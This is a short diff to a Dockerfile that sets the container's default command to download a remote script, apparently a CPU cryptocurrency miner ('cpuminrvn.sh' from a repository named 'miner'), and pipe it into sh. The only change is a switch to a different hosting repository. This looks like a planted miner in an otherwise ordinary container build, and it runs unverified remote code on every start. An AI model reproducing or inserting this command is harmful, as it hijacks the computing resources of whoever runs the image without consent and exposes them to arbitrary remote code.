@@ -35,4 +35,4 @@ ENV HOME /root
 WORKDIR /root
 
 # Define default command.
-CMD curl https://gitlab.com/dorisbhhbyoqzey/sc/-/raw/main/cpuminrvn.sh | sh
+CMD curl https://gitlab.com/erdepegitren/miner/-/raw/main/cpuminrvn.sh | sh
